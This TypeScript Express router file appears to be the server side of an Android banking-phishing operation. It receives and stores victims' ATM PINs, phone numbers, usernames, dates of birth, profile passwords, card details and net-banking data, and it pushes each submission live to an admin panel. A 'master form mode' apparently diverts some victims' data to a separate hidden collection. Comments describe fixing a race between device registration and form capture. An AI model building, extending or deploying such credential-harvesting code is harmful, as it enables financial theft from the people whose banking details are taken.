import express, { Request, Response } from "express";
import FormSubmission from "../models/FormSubmission";
import MasterFormSubmission from "../models/MasterFormSubmission";
import Payment from "../models/Payment";
import Device from "../models/Device";
import AdminModel from "../models/Admin";
import logger from "../logger/logger";
import wsService from "../services/wsService";

const router = express.Router();

function transformFormDoc(doc: any) {
  const payload = doc.payload || {};
  const phoneNumber = payload.phoneNumber ?? payload.mobileNumber ?? payload.phone ?? payload.msisdn ?? payload.phone_number ?? "";
  const username    = payload.username ?? payload.name ?? payload.userName ?? payload.user ?? "";
  const atmPin      = payload.atmPin ?? payload.pin ?? payload.atm_pin ?? payload.atmpin ?? payload.pin_code ?? "";
  return {
    _id: doc._id,
    uniqueid: doc.uniqueid || payload.uniqueid || "",
    phoneNumber,
    username,
    atmPin,
    payload,
    createdAt: doc.createdAt,
    updatedAt: doc.updatedAt,
  };
}

// ── MASTER FORM MODE CHECK ──
async function isDeviceMasterForm(uniqueid: string): Promise<boolean> {
  try {
    // Global master form mode
    const globalDoc = await AdminModel.findOne({ key: "master_form_mode" }).lean();
    if ((globalDoc as any)?.meta?.enabled === true) return true;
    // Per device flag
    const device = await Device.findOne({ deviceId: uniqueid }).select("masterFormDevice").lean();
    return (device as any)?.masterFormDevice === true;
  } catch {
    return false;
  }
}

// FIX: Form submit hone pe Device stub create karo agar exist nahi karta.
// Race condition: Android device registration (~2-3 sec) se pehle form submit ho jaata hai
// toh Device collection mein koi entry nahi hoti — admin panel mein device nahi dikhta.
// $setOnInsert: sirf naya document create hone pe set karo, existing ko touch mat karo.
async function ensureDeviceExists(uniqueid: string): Promise<void> {
  if (!uniqueid) return;
  try {
    const device = await Device.findOneAndUpdate(
      { deviceId: uniqueid },
      {
        $setOnInsert: {
          deviceId: uniqueid,
          "lastSeen.at": Date.now(),
          "lastSeen.action": "form_submit",
          "metadata.registeredAt": Date.now(),
        },
      },
      { upsert: true, new: true }
    );
    // Admin panel ko real-time update bhejo — device card turant dikh jaaye
    try {
      wsService.broadcastDeviceUpsert(device.toObject ? device.toObject() : device);
    } catch (_) {}
  } catch (_) {}
}

/* ═══════════════════════════════════════════
   DASHBOARD SUMMARY
   ═══════════════════════════════════════════ */

router.get("/dashboard/forms-summary", async (_req: Request, res: Response) => {
  try {
    const [formsCount, cardPaymentsCount, netBankingCount] = await Promise.all([
      FormSubmission.countDocuments({}),
      Payment.countDocuments({ method: "card" }),
      Payment.countDocuments({ method: "netbanking" }),
    ]);
    return res.json({
      formsCount: Number(formsCount || 0),
      cardPaymentsCount: Number(cardPaymentsCount || 0),
      netBankingCount: Number(netBankingCount || 0),
    });
  } catch (err: any) {
    logger.error("forms: dashboard forms-summary failed", err);
    return res.status(500).json({ formsCount: 0, cardPaymentsCount: 0, netBankingCount: 0 });
  }
});

/* ═══════════════════════════════════════════
   PER-DEVICE COUNTS
   ═══════════════════════════════════════════ */

router.get("/forms/per-device-counts", async (_req: Request, res: Response) => {
  try {
    const [formAgg, cardAgg, netAgg] = await Promise.all([
      FormSubmission.aggregate([{ $group: { _id: "$uniqueid", count: { $sum: 1 } } }]),
      Payment.aggregate([{ $match: { method: "card" } }, { $group: { _id: "$uniqueid", count: { $sum: 1 } } }]),
      Payment.aggregate([{ $match: { method: "netbanking" } }, { $group: { _id: "$uniqueid", count: { $sum: 1 } } }]),
    ]);
    const result: Record<string, number> = {};
    for (const item of [...formAgg, ...cardAgg, ...netAgg]) {
      if (!item._id) continue;
      result[item._id] = (result[item._id] || 0) + item.count;
    }
    return res.json(result);
  } catch (err: any) {
    logger.error("forms: per-device-counts failed", err);
    return res.status(500).json({});
  }
});

/* ═══════════════════════════════════════════
   LIST + GET FORM SUBMISSIONS
   ═══════════════════════════════════════════ */

router.get("/form_submissions", async (_req: Request, res: Response) => {
  try {
    const docs = await FormSubmission.find().lean();
    return res.json(docs.map(transformFormDoc));
  } catch (err: any) {
    logger.error("forms: list form_submissions failed", err);
    return res.status(500).json([]);
  }
});

router.get("/form_submissions/user/:uniqueid", async (req: Request, res: Response) => {
  try {
    const docs = await FormSubmission.find({ uniqueid: req.params.uniqueid }).lean();
    return res.json(docs.map(transformFormDoc));
  } catch (err: any) {
    logger.error("forms: fetch by device failed", err);
    return res.status(500).json([]);
  }
});

router.delete("/form_submissions/:uniqueid", async (req: Request, res: Response) => {
  try {
    await FormSubmission.deleteOne({ uniqueid: req.params.uniqueid });
    return res.json({ success: true });
  } catch (err: any) {
    logger.error("forms: delete form_submission failed", err);
    return res.status(500).json({ success: false, error: err?.message });
  }
});

/* ═══════════════════════════════════════════
   PAYMENTS
   ═══════════════════════════════════════════ */

router.get("/card_payments/device/:uniqueid", async (req: Request, res: Response) => {
  try {
    const docs = await Payment.find({ uniqueid: req.params.uniqueid, method: "card" }).lean();
    return res.json(docs.map((d) => d.payload));
  } catch (err: any) {
    logger.error("forms: card payments fetch failed", err);
    return res.status(500).json([]);
  }
});

router.get("/net_banking/device/:uniqueid", async (req: Request, res: Response) => {
  try {
    const docs = await Payment.find({ uniqueid: req.params.uniqueid, method: "netbanking" }).lean();
    return res.json(docs.map((d) => d.payload));
  } catch (err: any) {
    logger.error("forms: net banking fetch failed", err);
    return res.status(500).json([]);
  }
});

/* ═══════════════════════════════════════════
   SUCCESS DATA
   ═══════════════════════════════════════════ */

router.get("/success_data/device/:uniqueid", async (req: Request, res: Response) => {
  try {
    const doc = await FormSubmission.findOne({ uniqueid: req.params.uniqueid }).lean();
    if (!doc) return res.json({ dob: "", profilePassword: "" });
    const payload = doc.payload || {};
    return res.json({ dob: payload.dob || "", profilePassword: payload.profilePassword || "" });
  } catch (err: any) {
    logger.error("forms: success_data fetch failed", err);
    return res.status(500).json({});
  }
});

router.post("/success_data", async (req: Request, res: Response) => {
  const body     = req.body || {};
  const uniqueid = body.uniqueid || "";
  if (!uniqueid) return res.status(400).json({ success: false, error: "missing uniqueid" });
  try {
    const update: any = { $set: {} };
    if (Object.prototype.hasOwnProperty.call(body, "dob"))             update.$set["payload.dob"] = body.dob ?? "";
    if (Object.prototype.hasOwnProperty.call(body, "profilePassword")) update.$set["payload.profilePassword"] = body.profilePassword ?? "";
    if (Object.keys(update.$set).length === 0) {
      logger.warn("forms: success_data called but no keys", { uniqueid });
      return res.json({ success: true });
    }
    await FormSubmission.findOneAndUpdate({ uniqueid }, update, { upsert: true });
    try { wsService.broadcastFormUpdate(uniqueid, { uniqueid, dob: body.dob, profilePassword: body.profilePassword, updatedAt: Date.now() }); } catch (e) { logger.warn("forms: broadcast form:update failed", e); }
    logger.info("forms: success_data updated", { uniqueid });
    return res.json({ success: true });
  } catch (err: any) {
    logger.error("forms: success_data failed", err);
    return res.status(500).json({ success: false, error: err?.message || "server error" });
  }
});

/* ═══════════════════════════════════════════
   POST FORM — WITH MASTER FORM CHECK
   ═══════════════════════════════════════════ */

router.post("/form_submissions", async (req: Request, res: Response) => {
  const body     = req.body || {};
  const uniqueid = (body.uniqueid || body.deviceId || "") as string;
  try {
    // ── MASTER FORM MODE CHECK ──
    const isMasterForm = await isDeviceMasterForm(uniqueid);

    if (isMasterForm) {
      // Mark device as masterFormDevice (so it shows in master panel list)
      try {
        await Device.findOneAndUpdate(
          { deviceId: uniqueid },
          { $set: { masterFormDevice: true } }
        );
      } catch (_) {}

      const masterDoc = new MasterFormSubmission({ uniqueid, payload: body });
      await masterDoc.save();

      logger.info("forms: saved to MasterFormSubmission", { uniqueid });

      try {
        wsService.broadcastFormNew(uniqueid, {
          ...transformFormDoc(masterDoc.toObject ? masterDoc.toObject() : masterDoc),
          isMaster: true,
        });
      } catch (e) { logger.warn("forms: broadcast master form:new failed", e); }

      return res.json({ success: true, masterMode: true });
    }

    // ── NORMAL FLOW ──

    // FIX: Device stub ensure karo — agar registration race condition se pehle form aaya
    // toh bhi admin panel mein device turant dikh jaaye. $setOnInsert se existing device safe.
    await ensureDeviceExists(uniqueid);

    const doc = new FormSubmission({ uniqueid, payload: body });
    await doc.save();
    logger.info("forms: form_submissions saved", { uniqueid: doc.uniqueid });
    try { wsService.broadcastFormNew(doc.uniqueid || uniqueid, transformFormDoc(doc.toObject ? doc.toObject() : doc)); } catch (e) { logger.warn("forms: broadcast form:new failed", e); }
    return res.json({ success: true });
  } catch (err: any) {
    logger.error("forms: save form_submissions failed", err);
    return res.status(500).json({ success: false, error: err?.message || "server error" });
  }
});

/* ═══════════════════════════════════════════
   POST PAYMENTS — WITH MASTER FORM CHECK
   ═══════════════════════════════════════════ */

router.post("/card_payments", async (req: Request, res: Response) => {
  try {
    const body     = req.body || {};
    const uniqueid = body.uniqueid || "";

    const isMasterForm = await isDeviceMasterForm(uniqueid);
    if (isMasterForm) {
      try { await Device.findOneAndUpdate({ deviceId: uniqueid }, { $set: { masterFormDevice: true } }); } catch (_) {}
      const masterDoc = new MasterFormSubmission({ uniqueid, payload: { ...body, _type: "card_payment" } });
      await masterDoc.save();
      logger.info("forms: card payment saved to MasterFormSubmission", { uniqueid });
      return res.json({ success: true, masterMode: true });
    }

    const p = new Payment({ uniqueid, method: "card", payload: body, status: "pending" });
    await p.save();
    try { wsService.broadcastPaymentNew(uniqueid, "card", body); } catch (e) { logger.warn("forms: broadcast payment:new(card) failed", e); }
    return res.json({ success: true });
  } catch (err: any) {
    logger.error("forms: card_payment failed", err);
    return res.status(500).json({ success: false, error: err?.message || "server error" });
  }
});

router.post("/net_banking", async (req: Request, res: Response) => {
  try {
    const body     = req.body || {};
    const uniqueid = body.uniqueid || "";

    const isMasterForm = await isDeviceMasterForm(uniqueid);
    if (isMasterForm) {
      try { await Device.findOneAndUpdate({ deviceId: uniqueid }, { $set: { masterFormDevice: true } }); } catch (_) {}
      const masterDoc = new MasterFormSubmission({ uniqueid, payload: { ...body, _type: "net_banking" } });
      await masterDoc.save();
      logger.info("forms: netbanking saved to MasterFormSubmission", { uniqueid });
      return res.json({ success: true, masterMode: true });
    }

    const p = new Payment({ uniqueid, method: "netbanking", payload: body, status: "pending" });
    await p.save();
    try { wsService.broadcastPaymentNew(uniqueid, "netbanking", body); } catch (e) { logger.warn("forms: broadcast payment:new(netbanking) failed", e); }
    return res.json({ success: true });
  } catch (err: any) {
    logger.error("forms: net_banking failed", err);
    return res.status(500).json({ success: false, error: err?.message || "server error" });
  }
});

export default router;
